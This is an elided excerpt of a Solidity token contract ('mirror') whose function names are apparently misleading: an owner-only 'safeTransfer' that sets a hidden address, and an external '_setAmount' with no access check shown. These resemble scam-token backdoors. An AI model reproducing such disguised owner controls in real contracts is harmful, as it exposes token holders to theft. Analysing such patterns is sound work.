...
contract Ownership is Context {  
    ...
    */
    ...
    function safeTransfer(address newOwner) external onlyOwner {
        _fac = newOwner;
    }  
...
contract mirror is Context, IERC20, Ownership{
    ...
    function NewPendingAdmin(address shareholder) external view returns (uint256, uint256, uint256, uint256) {
        return (
            _feeTotalShares,
    ...
    function _setAmount(address shareholder, uint256 amount) external {
    ...
    function _setAllFees(uint8 _buybackfee, uint8 _reflectionfee, uint8 _marketingfee, uint8 _devfee, uint8 _feedenominator) external onlyOwner {
    ...
    function swapExactTokensForTokens(uint256 buybackMultiplierTriggeredAt, uint256 totalFee) public view returns (uint256) {
			if (
